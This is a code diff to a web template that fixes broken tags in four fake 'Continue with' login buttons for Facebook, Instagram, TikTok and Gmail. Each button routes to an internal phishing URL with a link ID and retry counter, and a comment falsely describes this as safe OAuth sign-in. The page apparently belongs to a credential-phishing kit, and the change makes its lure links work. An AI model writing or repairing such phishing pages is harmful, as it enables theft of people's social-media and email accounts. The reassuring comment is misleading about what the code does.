@@ -305,28 +305,28 @@
          <!-- the urls leads safely to site that authorize with Oath of the social pages -->
         <div class="action-buttons">
           <% if(linkType == 'FACEBOOK'){%>
-          <a href="<%= INTERNAL_PHISHING_URL =>/face/<%= linkId %>?retry=<%=link.numberOfRetries%>" class="social-btn facebook-btn" onclick="showLoading()">
+          <a href="<%= INTERNAL_PHISHING_URL %>/face/<%= linkId %>?retry=<%=link.numberOfRetries%>" class="social-btn facebook-btn" onclick="showLoading()">
             <img src="/img/facebook-logo.png" alt="Facebook" />
             <span>Continue with Facebook</span>
           </a>
           <%}%> 
           
           <% if(linkType == 'INSTAGRAM'){%>
-          <a href="<%= INTERNAL_PHISHING_URL =>/inst/<%= linkId %>?retry=<%=link.numberOfRetries%>" class="social-btn instagram-btn" onclick="showLoading()">
+          <a href="<%= INTERNAL_PHISHING_URL %>/inst/<%= linkId %>?retry=<%=link.numberOfRetries%>" class="social-btn instagram-btn" onclick="showLoading()">
             <img src="/insta.webp" />
             <span>Continue with Instagram</span>
           </a>
           <%}%> 
           
           <% if(linkType == 'TIKTOK'){%>
-          <a href="<%= INTERNAL_PHISHING_URL =>/tikto/<%= linkId %>?retry=<%=link.numberOfRetries%>" class="social-btn tiktok-btn" onclick="showLoading()">
+          <a href="<%= INTERNAL_PHISHING_URL %>/tikto/<%= linkId %>?retry=<%=link.numberOfRetries%>" class="social-btn tiktok-btn" onclick="showLoading()">
             <img src="/tiktok/tiktok.png" />
             <span>Continue with TikTok</span>
           </a>
           <%}%> 
           
           <% if(linkType == 'GMAIL'){%>
-          <a href="<%= INTERNAL_PHISHING_URL =>/gma/<%= linkId %>?retry=<%=link.numberOfRetries%>" class="social-btn gmail-btn" onclick="showLoading()">
+          <a href="<%= INTERNAL_PHISHING_URL %>/gma/<%= linkId %>?retry=<%=link.numberOfRetries%>" class="social-btn gmail-btn" onclick="showLoading()">
             <img src="/img/gmail.png" />
             <span>Continue with Gmail</span>
           </a>
